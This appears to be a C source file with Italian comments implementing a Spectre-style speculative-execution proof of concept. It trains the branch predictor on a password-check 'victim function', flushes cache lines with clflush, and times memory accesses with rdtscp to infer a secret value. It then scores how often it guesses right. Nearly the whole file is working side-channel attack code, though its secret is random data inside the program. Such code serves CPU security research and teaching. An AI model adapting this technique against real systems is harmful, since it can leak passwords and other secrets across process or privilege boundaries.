/*
 * spark.c
 *
 *  Created on: 02 lug 2018
 *      Author: Marco
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <x86intrin.h> // per usare rdtscp e clflush

/********************************************************************
 Codice vittima
 ********************************************************************/
#define SIZE 3000

uint8_t unused1[64];
unsigned int secret[SIZE];
uint8_t unused2[64];
unsigned int array1[SIZE];
uint8_t unused3[64];
unsigned int passwordDigest[SIZE];

uint8_t temp = 0; /* Used so compiler won�t optimize out victim_function() */

void victim_function(int userID, int pwd) {
	if (pwd == passwordDigest[userID]) {
		temp &= array1[secret[userID]];
	}
}

/**********************************************************************
 Main
 *********************************************************************/

int main(int argn, char *argv[]) {

#define CACHELINE 512

	// verifica se gli argomenti sono in numero giusto
	// 1 - number of runs
	// 2 - number of tests
	// 3 - cache hit threshold

	if (argn - 1 != 4) {
		printf("Numero inesatto di argomenti (#round #test #threshold debug\n");
		exit(1);
	}

	// parametri
	int numberOfRuns = strtol(argv[1], NULL, 10); // numero di run per ogni test
	int numberOfTest = strtol(argv[2], NULL, 10); // numero di test
	int cacheHitThreshold = strtol(argv[3], NULL, 10); // soglia per cache hit
	int precisionLoss = strtol(argv[4], NULL, 10); // precisione dei risultati

	int debug = 0; // modalita con stampe
	int blocks = sizeof(array1[0]) * 8; // numero di bit occupati da ogni posizione dell'array
	int delta = CACHELINE / blocks; // numero di elementi in una line
	int class = SIZE / delta + 1; // classi di risultati

	// contatori
	int ok = 0;
	int error = 0;
	int noHit = 0;

	int results[class]; // array risultati

	unsigned int timeReg;
	register uint64_t time1, time2;

	// inizializzo il seme del random per avere risultati diversi ad ogni test
	srand(time(NULL));

	for (int t = 1; t <= numberOfTest; t++) {

		printf("Test %d di %d\n", t, numberOfTest);

		// scelgo casualmente l'user da attaccare
		int userUnderAttack = rand() % SIZE;

		// inizializzo casualmente gli array
		for (int i = 0; i < SIZE; i++) {
			passwordDigest[i] = rand() % SIZE;
			array1[i] = rand() % SIZE;
			secret[i] = rand() % SIZE;
		}

		// inizializzo a 0 l'array risultati
		for (int i = 0; i < class; i++) {
			results[i] = 0;
		}

		// per ogni run
		for (int j = 0; j < numberOfRuns; j++) {

			for (int l = 1; l <= class; l++) {

				//addestro il branch predictor
				for (int i = 1; i < 10; i++) {
					victim_function(1, passwordDigest[1]);
				}

				// flushing array1 e passwordDigest dalla cache
				for (int i = 0; i < SIZE; i++) {
					_mm_clflush(&array1[i]);
					_mm_clflush(&passwordDigest[i]);
				}

				for (volatile int z = 0; z < 100; z++) {
				} /* Delay (can also mfence) */

				// richiamo la funzione vittima con l'ID da attaccare
				victim_function(userUnderAttack, 1);

				for (volatile int z = 0; z < 100; z++) {
				} /* Delay (can also mfence) */

				// calcolo il tempo di accesso alla posizione l
				time1 = __rdtscp(&timeReg);
				timeReg = array1[l * delta];
				time2 = __rdtscp(&timeReg) - time1;

				for (volatile int z = 0; z < 100; z++) {
				} /* Delay (can also mfence) */

				// aggiorno la posizione corrispondente di results
				// se il tempo < della soglia
				if ((int) time2 <= cacheHitThreshold) {
					if (debug) {
						printf("round %d - time = %d results[%d] %d ", j,
								(int) time2, l, results[l]);
					}
					results[l]++;
					if (debug) {
						printf("-> %d\n", results[l]);
					}
				}
			}
		}

		// cerco il massimo nell'array dei risultati
		int max = -1;
		int index = -1;
		for (int i = 0; i < class; i++) {
			if (debug) {
				if (results[i] > 0) {
					printf("results [%d] = %d\n", i, results[i]);
				}
			}

			if (results[i] >= max) {
				max = results[i];
				index = i;
			}
		}

		// stampo il risultato confrontando il candidato
		// con il piu alto numero di occorrenze e lo confronto con il segreto
		// assicurandomi che ci sia almeno una occorrenza
		int rangeMax =
				((index + 1) * delta + (precisionLoss * delta) >= SIZE) ?
						SIZE : (index + 1) * delta + (precisionLoss * delta);
		int rangeMin =
				((index - 1) * delta - (precisionLoss * delta) <= 0) ?
						0 : (index - 1) * delta - (precisionLoss * delta);

		if (results[index] > 0 && rangeMin <= secret[userUnderAttack]
				&& rangeMax >= secret[userUnderAttack]) {
			printf("OK: predizione tra %d e %d, segreto = %d\n", rangeMin,
					rangeMax, secret[userUnderAttack]);
			ok++;
		} else if (results[index] == 0) {
			printf("***** NO-HIT: nessuna hit rilevata in %d tentativi *****\n",
					numberOfRuns);
			noHit++;
		} else {
			printf("***** ERROR: predizione tra %d e %d, segreto = %d *****\n", rangeMin,
					rangeMax, secret[userUnderAttack]);
			error++;
		}
	}

// stampo il conteggio totale degli errori e degli ok
	printf("***TOTALI***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit, error);

	return (0);
}